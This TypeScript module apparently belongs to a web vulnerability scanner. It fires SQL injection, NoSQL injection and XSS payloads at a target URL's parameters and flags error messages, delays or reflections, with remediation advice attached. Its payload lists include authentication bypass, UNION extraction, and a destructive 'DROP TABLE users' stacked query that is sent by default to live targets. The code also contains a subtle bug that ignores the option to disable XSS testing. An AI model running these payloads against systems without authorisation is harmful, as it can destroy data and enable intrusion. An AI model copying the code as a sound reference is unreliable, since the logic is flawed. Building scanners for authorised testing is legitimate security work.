// STRIX Injection Testing Module
// Comprehensive SQL Injection and XSS testing (browser/Electron compatible)

import type { UnifiedVulnerability, ParameterInfo, FormInfo } from '../types';

// Check if running in Electron
// @ts-ignore
const isElectron = typeof window !== 'undefined' && window.ipcRenderer !== undefined;

// ============================================================================
// SQL INJECTION PAYLOADS
// ============================================================================

export const SQLI_PAYLOADS = {
    // Error-based - triggers visible SQL errors
    errorBased: [
        { payload: "'", name: 'Single Quote', technique: 'error' },
        { payload: '"', name: 'Double Quote', technique: 'error' },
        { payload: "' OR '1'='1", name: 'OR Tautology', technique: 'error' },
        { payload: "' OR '1'='1' --", name: 'OR with Comment', technique: 'error' },
        { payload: "' OR '1'='1' #", name: 'OR with Hash Comment', technique: 'error' },
        { payload: "1' OR '1'='1", name: 'Numeric OR', technique: 'error' },
        { payload: "') OR ('1'='1", name: 'Parenthesis OR', technique: 'error' },
        { payload: "admin'--", name: 'Admin Bypass', technique: 'error' },
        { payload: "1' AND '1'='1", name: 'AND True', technique: 'error' },
        { payload: "1' AND '1'='2", name: 'AND False', technique: 'error' },
        { payload: "1; DROP TABLE users--", name: 'Stacked Query', technique: 'error' },
        { payload: "' UNION SELECT NULL--", name: 'Union Probe', technique: 'error' },
    ],

    // Boolean-based blind - detects by response differences
    booleanBased: [
        { payload: "' AND 1=1--", name: 'Boolean True', technique: 'boolean' },
        { payload: "' AND 1=2--", name: 'Boolean False', technique: 'boolean' },
        { payload: "' AND 'a'='a", name: 'String True', technique: 'boolean' },
        { payload: "' AND 'a'='b", name: 'String False', technique: 'boolean' },
        { payload: "1 AND 1=1", name: 'Numeric True', technique: 'boolean' },
        { payload: "1 AND 1=2", name: 'Numeric False', technique: 'boolean' },
        { payload: "' OR 1=1--", name: 'OR True', technique: 'boolean' },
        { payload: "' OR 1=2--", name: 'OR False', technique: 'boolean' },
    ],

    // Time-based blind - detects by response delay
    timeBased: [
        { payload: "' OR SLEEP(3)--", name: 'MySQL Sleep', technique: 'time', delay: 3000 },
        { payload: "'; WAITFOR DELAY '0:0:3'--", name: 'MSSQL Waitfor', technique: 'time', delay: 3000 },
        { payload: "' OR pg_sleep(3)--", name: 'PostgreSQL Sleep', technique: 'time', delay: 3000 },
        { payload: "1' AND SLEEP(3)--", name: 'MySQL AND Sleep', technique: 'time', delay: 3000 },
        { payload: "' || DBMS_PIPE.RECEIVE_MESSAGE('a',3)--", name: 'Oracle Sleep', technique: 'time', delay: 3000 },
    ],

    // Union-based - extracts data via UNION queries
    unionBased: [
        { payload: "' UNION SELECT NULL--", name: '1 Column', technique: 'union' },
        { payload: "' UNION SELECT NULL,NULL--", name: '2 Columns', technique: 'union' },
        { payload: "' UNION SELECT NULL,NULL,NULL--", name: '3 Columns', technique: 'union' },
        { payload: "' UNION ALL SELECT 1,2,3--", name: 'Union All', technique: 'union' },
        { payload: "' UNION SELECT @@version--", name: 'Version Extract', technique: 'union' },
        { payload: "' ORDER BY 1--", name: 'Order By 1', technique: 'union' },
        { payload: "' ORDER BY 10--", name: 'Order By 10', technique: 'union' },
        { payload: "' ORDER BY 100--", name: 'Order By 100', technique: 'union' },
    ],

    // NoSQL injection payloads
    nosql: [
        { payload: '{"$gt":""}', name: 'MongoDB GT', technique: 'nosql' },
        { payload: '{"$ne":null}', name: 'MongoDB NE', technique: 'nosql' },
        { payload: "'; return true; var x='", name: 'JS Injection', technique: 'nosql' },
        { payload: '||1==1', name: 'NoSQL OR', technique: 'nosql' },
        { payload: "' || '1'=='1", name: 'String OR', technique: 'nosql' },
    ]
};

// SQL error detection patterns
export const SQL_ERROR_PATTERNS: Array<{ pattern: RegExp; db: string }> = [
    // MySQL/MariaDB
    { pattern: /you have an error in your sql syntax/i, db: 'MySQL' },
    { pattern: /warning: mysql/i, db: 'MySQL' },
    { pattern: /mysql_fetch/i, db: 'MySQL' },
    { pattern: /mysqli_/i, db: 'MySQL' },
    { pattern: /SQL syntax.*MySQL/i, db: 'MySQL' },
    { pattern: /MariaDB server version/i, db: 'MariaDB' },

    // PostgreSQL
    { pattern: /postgresql.*error/i, db: 'PostgreSQL' },
    { pattern: /pg_query/i, db: 'PostgreSQL' },
    { pattern: /PSQLException/i, db: 'PostgreSQL' },
    { pattern: /unterminated quoted string/i, db: 'PostgreSQL' },

    // SQL Server
    { pattern: /microsoft.*odbc.*sql.*server/i, db: 'MSSQL' },
    { pattern: /SqlException/i, db: 'MSSQL' },
    { pattern: /SQL Server.*error/i, db: 'MSSQL' },
    { pattern: /Unclosed quotation mark/i, db: 'MSSQL' },
    { pattern: /mssql_query/i, db: 'MSSQL' },

    // Oracle
    { pattern: /ora-\d{5}/i, db: 'Oracle' },
    { pattern: /oracle.*error/i, db: 'Oracle' },
    { pattern: /quoted string not properly terminated/i, db: 'Oracle' },

    // SQLite
    { pattern: /sqlite.*error/i, db: 'SQLite' },
    { pattern: /sqlite3\.OperationalError/i, db: 'SQLite' },
    { pattern: /SQLITE_ERROR/i, db: 'SQLite' },

    // Generic
    { pattern: /syntax error/i, db: 'Unknown' },
    { pattern: /sql error/i, db: 'Unknown' },
    { pattern: /database error/i, db: 'Unknown' },
    { pattern: /query failed/i, db: 'Unknown' },
    { pattern: /invalid query/i, db: 'Unknown' },
];

// ============================================================================
// XSS PAYLOADS
// ============================================================================

export const XSS_PAYLOADS = {
    // Basic HTML injection
    basic: [
        { payload: '<script>alert(1)</script>', marker: '<script>alert', context: 'html' },
        { payload: '<img src=x onerror=alert(1)>', marker: 'onerror=alert', context: 'html' },
        { payload: '<svg onload=alert(1)>', marker: '<svg onload', context: 'html' },
        { payload: '<body onload=alert(1)>', marker: '<body onload', context: 'html' },
        { payload: '<iframe src="javascript:alert(1)">', marker: 'javascript:alert', context: 'html' },
        { payload: '<div onmouseover=alert(1)>hover</div>', marker: 'onmouseover=alert', context: 'html' },
    ],

    // Attribute breakout
    attribute: [
        { payload: '"><script>alert(1)</script>', marker: '<script>alert', context: 'attribute' },
        { payload: "'\"><script>alert(1)</script>", marker: '<script>alert', context: 'attribute' },
        { payload: '" onmouseover="alert(1)"', marker: 'onmouseover=', context: 'attribute' },
        { payload: "' onfocus='alert(1)' autofocus='", marker: 'onfocus=', context: 'attribute' },
        { payload: '" onclick="alert(1)"', marker: 'onclick=', context: 'attribute' },
        { payload: "' onload='alert(1)'", marker: 'onload=', context: 'attribute' },
    ],

    // JavaScript context
    javascript: [
        { payload: "';alert(1);//", marker: "alert(1)", context: 'javascript' },
        { payload: '";alert(1);//', marker: 'alert(1)', context: 'javascript' },
        { payload: '</script><script>alert(1)</script>', marker: '<script>alert', context: 'javascript' },
        { payload: '-alert(1)-', marker: 'alert(1)', context: 'javascript' },
        { payload: '${alert(1)}', marker: '${alert', context: 'javascript' },
    ],

    // Filter bypass / encoded
    bypass: [
        { payload: '<ScRiPt>alert(1)</ScRiPt>', marker: '<script>alert', context: 'bypass' },
        { payload: '<img src=x onerror=alert`1`>', marker: 'onerror=alert', context: 'bypass' },
        { payload: '<svg/onload=alert(1)>', marker: '<svg', context: 'bypass' },
        { payload: '<<script>script>alert(1)</script>', marker: '<script>alert', context: 'bypass' },
        { payload: '<img src=1 oNeRrOr=alert(1)>', marker: 'onerror=alert', context: 'bypass' },
        { payload: '<IMG """><SCRIPT>alert(1)</SCRIPT>">', marker: '<script>alert', context: 'bypass' },
    ],

    // URL protocol handlers
    protocol: [
        { payload: 'javascript:alert(1)', marker: 'javascript:', context: 'url' },
        { payload: 'data:text/html,<script>alert(1)</script>', marker: 'data:text/html', context: 'url' },
        { payload: 'vbscript:alert(1)', marker: 'vbscript:', context: 'url' },
    ],

    // Polyglot payloads (work in multiple contexts)
    polyglot: [
        {
            payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
            marker: 'javascript:',
            context: 'polyglot'
        },
        {
            payload: "'\"-->]]>*/</script></style></title></textarea></noscript><script>alert(1)</script>",
            marker: '<script>alert',
            context: 'polyglot'
        },
    ]
};

// DOM XSS sink patterns
export const DOM_SINKS = [
    { pattern: /document\.write\s*\(/gi, sink: 'document.write', severity: 'high' },
    { pattern: /document\.writeln\s*\(/gi, sink: 'document.writeln', severity: 'high' },
    { pattern: /\.innerHTML\s*=/gi, sink: 'innerHTML', severity: 'high' },
    { pattern: /\.outerHTML\s*=/gi, sink: 'outerHTML', severity: 'high' },
    { pattern: /\.insertAdjacentHTML\s*\(/gi, sink: 'insertAdjacentHTML', severity: 'high' },
    { pattern: /eval\s*\(/gi, sink: 'eval()', severity: 'critical' },
    { pattern: /setTimeout\s*\(\s*['"]/gi, sink: 'setTimeout', severity: 'high' },
    { pattern: /setInterval\s*\(\s*['"]/gi, sink: 'setInterval', severity: 'high' },
    { pattern: /new\s+Function\s*\(/gi, sink: 'Function()', severity: 'critical' },
    { pattern: /location\s*=/gi, sink: 'location', severity: 'medium' },
    { pattern: /location\.href\s*=/gi, sink: 'location.href', severity: 'medium' },
    { pattern: /\$\([^)]*\)\.html\s*\(/gi, sink: 'jQuery.html()', severity: 'high' },
];

// DOM XSS source patterns
export const DOM_SOURCES = [
    /location\.hash/gi,
    /location\.search/gi,
    /location\.href/gi,
    /document\.URL/gi,
    /document\.referrer/gi,
    /window\.name/gi,
    /document\.cookie/gi,
    /localStorage\./gi,
    /sessionStorage\./gi,
];

// ============================================================================
// INTERFACES
// ============================================================================

export interface InjectionTestOptions {
    timeout?: number;
    aggressive?: boolean;
    testSqli?: boolean;
    testXss?: boolean;
    testNosql?: boolean;
    testTimeBased?: boolean;
    maxPayloads?: number;
    onProgress?: (current: number, total: number, message: string) => void;
}

export interface InjectionTestResult {
    parameter: string;
    payload: string;
    type: 'sqli' | 'xss' | 'nosql';
    technique: string;
    vulnerable: boolean;
    evidence?: string;
    dbType?: string;
    responseTime?: number;
    context?: string;
}

// ============================================================================
// FETCH HELPER
// ============================================================================

interface FetchResponse {
    ok: boolean;
    status: number;
    body: string;
    headers: Record<string, string>;
    responseTime: number;
    error?: string;
}

async function testFetch(url: string, options: {
    method?: string;
    body?: string;
    headers?: Record<string, string>;
    timeout?: number;
} = {}): Promise<FetchResponse> {
    const startTime = Date.now();

    if (isElectron) {
        try {
            // @ts-ignore
            const response = await window.ipcRenderer.invoke('web-scan-fetch', {
                url,
                method: options.method || 'GET',
                headers: options.headers || {},
                body: options.body,
                timeout: options.timeout || 15000
            });

            return {
                ok: response.success && response.status >= 200 && response.status < 400,
                status: response.status || 0,
                body: response.body || '',
                headers: response.headers || {},
                responseTime: Date.now() - startTime,
                error: response.error
            };
        } catch (error) {
            return {
                ok: false,
                status: 0,
                body: '',
                headers: {},
                responseTime: Date.now() - startTime,
                error: error instanceof Error ? error.message : 'Request failed'
            };
        }
    } else {
        // Browser mode
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), options.timeout || 15000);

            const response = await fetch(url, {
                method: options.method || 'GET',
                headers: options.headers,
                body: options.body,
                signal: controller.signal
            });

            clearTimeout(timeoutId);

            const body = await response.text();
            const headers: Record<string, string> = {};
            response.headers.forEach((v, k) => headers[k] = v);

            return {
                ok: response.ok,
                status: response.status,
                body,
                headers,
                responseTime: Date.now() - startTime
            };
        } catch (error) {
            return {
                ok: false,
                status: 0,
                body: '',
                headers: {},
                responseTime: Date.now() - startTime,
                error: error instanceof Error ? error.message : 'Request failed'
            };
        }
    }
}

// ============================================================================
// SQL INJECTION TESTING
// ============================================================================

/**
 * Test a parameter for SQL injection
 */
export async function testSqlInjection(
    baseUrl: string,
    parameter: ParameterInfo,
    options: InjectionTestOptions = {}
): Promise<InjectionTestResult[]> {
    const results: InjectionTestResult[] = [];

    // Select payloads based on options
    let payloads = [
        ...SQLI_PAYLOADS.errorBased,
        ...SQLI_PAYLOADS.booleanBased,
    ];

    if (options.aggressive) {
        payloads.push(...SQLI_PAYLOADS.unionBased);
    }

    if (options.testTimeBased) {
        payloads.push(...SQLI_PAYLOADS.timeBased);
    }

    if (options.testNosql) {
        payloads.push(...SQLI_PAYLOADS.nosql);
    }

    // Limit payloads if specified
    if (options.maxPayloads && payloads.length > options.maxPayloads) {
        payloads = payloads.slice(0, options.maxPayloads);
    }

    // Get baseline response
    const baseline = await testFetch(baseUrl, { timeout: options.timeout });
    if (!baseline.ok) return results;

    // Test each payload
    for (let i = 0; i < payloads.length; i++) {
        const { payload, technique } = payloads[i];

        if (options.onProgress) {
            options.onProgress(i + 1, payloads.length, `SQLi: ${parameter.name}`);
        }

        // Construct test URL/body
        const testUrl = buildTestUrl(baseUrl, parameter, payload);

        const response = await testFetch(testUrl, { timeout: options.timeout });

        const result: InjectionTestResult = {
            parameter: parameter.name,
            payload,
            type: technique === 'nosql' ? 'nosql' : 'sqli',
            technique,
            vulnerable: false,
            responseTime: response.responseTime
        };

        if (response.ok) {
            // Check for SQL errors
            const errorMatch = detectSqlError(response.body);
            if (errorMatch) {
                result.vulnerable = true;
                result.evidence = errorMatch.error;
                result.dbType = errorMatch.db;
            }

            // Check for time-based (delay > 2.5 seconds)
            if (technique === 'time' && response.responseTime > 2500) {
                result.vulnerable = true;
                result.evidence = `Response delayed: ${response.responseTime}ms`;
            }

            // Check for boolean-based differences
            if (technique === 'boolean') {
                const diff = Math.abs(response.body.length - baseline.body.length);
                if (diff > 200) {
                    // Might indicate boolean SQLi - mark as potential
                    result.evidence = `Content length diff: ${diff} bytes`;
                }
            }
        }

        if (result.vulnerable) {
            results.push(result);
        }
    }

    return results;
}

/**
 * Detect SQL error in response body
 */
function detectSqlError(body: string): { error: string; db: string } | null {
    for (const { pattern, db } of SQL_ERROR_PATTERNS) {
        const match = body.match(pattern);
        if (match) {
            return {
                error: match[0].substring(0, 200),
                db
            };
        }
    }
    return null;
}

// ============================================================================
// XSS TESTING
// ============================================================================

/**
 * Test a parameter for XSS
 */
export async function testXss(
    baseUrl: string,
    parameter: ParameterInfo,
    options: InjectionTestOptions = {}
): Promise<InjectionTestResult[]> {
    const results: InjectionTestResult[] = [];

    // Collect payloads
    let payloads = [
        ...XSS_PAYLOADS.basic,
        ...XSS_PAYLOADS.attribute,
    ];

    if (options.aggressive) {
        payloads.push(
            ...XSS_PAYLOADS.javascript,
            ...XSS_PAYLOADS.bypass,
            ...XSS_PAYLOADS.protocol,
            ...XSS_PAYLOADS.polyglot
        );
    }

    // Limit payloads if specified
    if (options.maxPayloads && payloads.length > options.maxPayloads) {
        payloads = payloads.slice(0, options.maxPayloads);
    }

    // Test each payload
    for (let i = 0; i < payloads.length; i++) {
        const { payload, marker, context } = payloads[i];

        if (options.onProgress) {
            options.onProgress(i + 1, payloads.length, `XSS: ${parameter.name}`);
        }

        const testUrl = buildTestUrl(baseUrl, parameter, payload);
        const response = await testFetch(testUrl, { timeout: options.timeout });

        const result: InjectionTestResult = {
            parameter: parameter.name,
            payload,
            type: 'xss',
            technique: 'reflected',
            vulnerable: false,
            context,
            responseTime: response.responseTime
        };

        if (response.ok) {
            // Check if payload or marker is reflected unescaped
            const reflection = detectXssReflection(response.body, payload, marker);
            if (reflection.vulnerable) {
                result.vulnerable = true;
                result.evidence = reflection.evidence;
            }
        }

        if (result.vulnerable) {
            results.push(result);
        }
    }

    return results;
}

/**
 * Detect XSS payload reflection
 */
function detectXssReflection(body: string, payload: string, marker: string): {
    vulnerable: boolean;
    evidence?: string
} {
    const bodyLower = body.toLowerCase();
    const markerLower = marker.toLowerCase();

    // Check for exact payload (unescaped)
    if (body.includes(payload)) {
        return {
            vulnerable: true,
            evidence: extractContext(body, payload, 100)
        };
    }

    // Check for marker (key dangerous part)
    if (bodyLower.includes(markerLower)) {
        return {
            vulnerable: true,
            evidence: extractContext(body, marker, 100)
        };
    }

    return { vulnerable: false };
}

/**
 * Extract context around a match
 */
function extractContext(body: string, match: string, contextLength: number): string {
    const index = body.toLowerCase().indexOf(match.toLowerCase());
    if (index === -1) return match;

    const start = Math.max(0, index - contextLength / 2);
    const end = Math.min(body.length, index + match.length + contextLength / 2);

    return '...' + body.substring(start, end).replace(/[\r\n]+/g, ' ') + '...';
}

/**
 * Analyze DOM for XSS sinks
 */
export function analyzeDomXss(html: string): Array<{
    sink: string;
    severity: string;
    hasSource: boolean;
    evidence: string;
}> {
    const results: Array<{
        sink: string;
        severity: string;
        hasSource: boolean;
        evidence: string;
    }> = [];

    // Extract scripts
    const scriptMatches = html.matchAll(/<script[^>]*>([\s\S]*?)<\/script>/gi);
    const scriptContent = Array.from(scriptMatches).map(m => m[1]).join('\n');

    // Check for sources
    const hasSource = DOM_SOURCES.some(p => p.test(scriptContent));

    // Check for sinks
    for (const { pattern, sink, severity } of DOM_SINKS) {
        const matches = scriptContent.matchAll(pattern);
        for (const match of matches) {
            // Extract line context
            const idx = scriptContent.indexOf(match[0]);
            const lineStart = scriptContent.lastIndexOf('\n', idx) + 1;
            const lineEnd = scriptContent.indexOf('\n', idx);
            const line = scriptContent.substring(lineStart, lineEnd === -1 ? undefined : lineEnd).trim();

            results.push({
                sink,
                severity,
                hasSource,
                evidence: line.substring(0, 200)
            });
        }
    }

    return results;
}

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

/**
 * Build test URL with injected payload
 */
function buildTestUrl(baseUrl: string, param: ParameterInfo, payload: string): string {
    try {
        const url = new URL(baseUrl);

        if (param.type === 'query') {
            url.searchParams.set(param.name, payload);
        } else if (param.type === 'path') {
            // Replace path segment
            const parts = url.pathname.split('/');
            for (let i = 0; i < parts.length; i++) {
                if (parts[i] === param.value) {
                    parts[i] = payload;
                    break;
                }
            }
            url.pathname = parts.join('/');
        }

        return url.toString();
    } catch {
        return baseUrl;
    }
}

/**
 * Run comprehensive injection tests on parameters
 */
export async function runInjectionTests(
    baseUrl: string,
    parameters: ParameterInfo[],
    options: InjectionTestOptions = {}
): Promise<{
    sqliResults: InjectionTestResult[];
    xssResults: InjectionTestResult[];
    vulnerabilities: UnifiedVulnerability[];
}> {
    const sqliResults: InjectionTestResult[] = [];
    const xssResults: InjectionTestResult[] = [];
    const vulnerabilities: UnifiedVulnerability[] = [];

    const shouldTestSqli = options.testSqli !== false;
    const shouldTestXss = options.testXss !== false;

    let current = 0;
    const total = parameters.length * (shouldTestSqli && shouldTestXss ? 2 : 1);

    for (const param of parameters) {
        // SQLi tests
        if (shouldTestSqli) {
            if (options.onProgress) {
                options.onProgress(++current, total, `Testing SQLi: ${param.name}`);
            }

            const sqliFindings = await testSqlInjection(baseUrl, param, options);
            sqliResults.push(...sqliFindings);

            // Generate vulnerabilities for findings
            if (sqliFindings.some(f => f.vulnerable)) {
                const vulnFindings = sqliFindings.filter(f => f.vulnerable);
                const techniques = [...new Set(vulnFindings.map(f => f.technique))];
                const dbType = vulnFindings.find(f => f.dbType)?.dbType;

                vulnerabilities.push({
                    id: `sqli-${param.name}-${Date.now()}`,
                    category: 'injection',
                    severity: 'critical',
                    title: 'SQL Injection Vulnerability',
                    description: `SQL injection found in parameter "${param.name}" using ${techniques.join(', ')} technique(s)${dbType ? ` (${dbType} database)` : ''}`,
                    url: baseUrl,
                    location: `Parameter: ${param.name}`,
                    evidence: vulnFindings[0]?.evidence || vulnFindings[0]?.payload,
                    recommendation: 'Use parameterized queries (prepared statements). Never concatenate user input into SQL queries.',
                    cwe: 'CWE-89',
                    owasp: 'A03:2021'
                });
            }
        }

        // XSS tests
        if (testXss) {
            if (options.onProgress) {
                options.onProgress(++current, total, `Testing XSS: ${param.name}`);
            }

            const xssFindings = await testXss(baseUrl, param, options);
            xssResults.push(...xssFindings);

            // Generate vulnerabilities for findings
            if (xssFindings.some(f => f.vulnerable)) {
                const vulnFindings = xssFindings.filter(f => f.vulnerable);
                const contexts = [...new Set(vulnFindings.map(f => f.context))];

                vulnerabilities.push({
                    id: `xss-${param.name}-${Date.now()}`,
                    category: 'injection',
                    severity: 'high',
                    title: 'Cross-Site Scripting (XSS)',
                    description: `Reflected XSS found in parameter "${param.name}" in ${contexts.join(', ')} context(s)`,
                    url: baseUrl,
                    location: `Parameter: ${param.name}`,
                    evidence: vulnFindings[0]?.evidence || vulnFindings[0]?.payload,
                    recommendation: 'Encode output based on context. Implement Content-Security-Policy header.',
                    cwe: 'CWE-79',
                    owasp: 'A03:2021'
                });
            }
        }
    }

    return { sqliResults, xssResults, vulnerabilities };
}

export default {
    testSqlInjection,
    testXss,
    analyzeDomXss,
    runInjectionTests,
    SQLI_PAYLOADS,
    XSS_PAYLOADS,
    SQL_ERROR_PATTERNS,
    DOM_SINKS,
    DOM_SOURCES
};
